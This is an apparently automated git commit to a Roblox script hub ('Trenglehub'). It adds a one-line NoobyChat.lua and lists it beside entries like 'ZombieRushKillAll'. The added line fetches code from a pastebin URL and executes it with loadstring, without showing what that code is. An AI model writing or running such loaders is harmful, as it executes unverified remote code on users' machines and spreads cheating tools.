21c04636719c71631ecd1443cca8d3a2b3fc9ae9
Emil Toth <69359704+Fantemil@users.noreply.github.com>
2022-09-25 04:43:48 +0200

    Updated automatically!

---
+++ Scripts/Autoadd/NoobyChat.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/97yQ5ZA7"))()
--- trenglehub.lua
+++ trenglehub.lua
@@ -10882,3 +10882,5 @@ addscriptexist(734159876, "SharkBiteGUI", "Acc", "https://raw.githubusercontent.
 addscriptexist(137885680, "ZombieRushKillAll", "Acc", "https://raw.githubusercontent.com/Fantemil/Trenglehub/main/Scripts/Autoadd/ZombieRushKillAll.lua")
                     
 addscriptexist(13822889, "LumberTycoon2PaintTools", "Acc", "https://raw.githubusercontent.com/Fantemil/Trenglehub/main/Scripts/Autoadd/LumberTycoon2PaintTools.lua")
+                    
+addscriptexist(6610021055, "NoobyChat", "Acc", "https://raw.githubusercontent.com/Fantemil/Trenglehub/main/Scripts/Autoadd/NoobyChat.lua")
